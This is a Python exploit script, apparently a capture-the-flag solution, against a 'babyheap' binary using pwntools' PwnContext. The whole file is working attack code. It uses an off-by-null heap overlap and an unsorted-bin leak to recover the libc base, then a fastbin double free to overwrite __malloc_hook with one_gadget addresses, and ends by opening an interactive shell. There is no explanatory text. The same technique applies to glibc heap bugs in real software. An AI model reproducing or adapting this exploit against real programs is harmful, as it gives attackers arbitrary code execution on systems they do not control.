from PwnContext import *
if __name__ == '__main__':        
    context.terminal = ['tmux', 'splitw', '-h']  # I always use tmux
    context.log_level = 'debug'
    #-----function for quick script-----#
    def sl(*args, **kwargs):
        new_args = [str(_) for _ in args]
        return ctx.sendline(*new_args, **kwargs)
    def s(*args, **kwargs):
        new_args = [str(_) for _ in args]
        return ctx.send(*new_args, **kwargs)
    def r(*args, **kwargs):
        return ctx.recv(*args, **kwargs)
    def ru(*args, **kwargs):
        return ctx.recvuntil(*args, **kwargs)
    def leak(*args, **kwargs):
        return ctx.leak(*args, **kwargs)
    def interact(*args, **kwargs):
        return ctx.interactive(*args, **kwargs)
    def dbg(gdbscript='', *args, **kwargs):
        gdbscript = sym_ctx.gdbscript + gdbscript
        return ctx.debug(gdbscript, *args, **kwargs)
    def rs(*args, **kwargs):
        return ctx.start(*args, **kwargs)
    
    def alloc(size, content):
        sl(1)
        ru('size')
        sl(size)
        ru('content')
        s(content)
        
    def show(ind):
        sl(2)
        ru('ind')
        sl(ind)
     
    def delete(ind):
        sl(3)
        ru('ind')
        sl(ind)
        
      
    ctx.binary = change_ld('./babyheap', './ld.so')
    ctx.libc = './libc.so.6'
    ctx.io_sleep = 0.1
    rs(env={'LD_PRELOAD':'./libc.so.6'})
    #rs()
    dbg('c')

    alloc(0x28, '\n') #0
    alloc(0xe0, '\n') #1
    alloc(0xf0, '\n') #2
    delete(1)
    alloc(0xf0, '\n') #3
    delete(2)
    alloc(0xf8, '\0'*0xf0+p64(0x1f0))
    alloc(0xf8, '\n') #4
    alloc(0x28, '\0'*0x28)
    
    
    
    alloc(0xf0, '\n') #1
    alloc(0x10, '\n') #2 - vuln
    delete(1)
    delete(3)
    alloc(0xf0, '\n') #1
    alloc(0xf0, '\n') #3
    delete(3)
    ctx.clean()
    show(2)
    ru('content: ')
    leak = u64(ru('\n')[:-1].ljust(8,'\0')) 
    ctx.libc.address = leak-0x399b78
    
    delete(0)
    delete(1)
    delete(4)
    
    alloc(0xf0, '\n')
    alloc(0x60, '\n')# 1 and 2
    alloc(0x60, '\n')# 3
    delete(1)
    delete(3)
    delete(2)
    
    alloc(0x60, p64(ctx.libc.sym['__malloc_hook']-0x1b-8)+'\n')
    alloc(0x60, '\n')
    alloc(0x60, '\n')
    
    one = [ctx.libc.address+0x3f722, ctx.libc.address+0xd6661]
    alloc(0x60, '\0'*0x13+p64(one[0])+'\n')
    
    alloc(0x20,'\n')
    
    interact()
    
    
    
    



    
    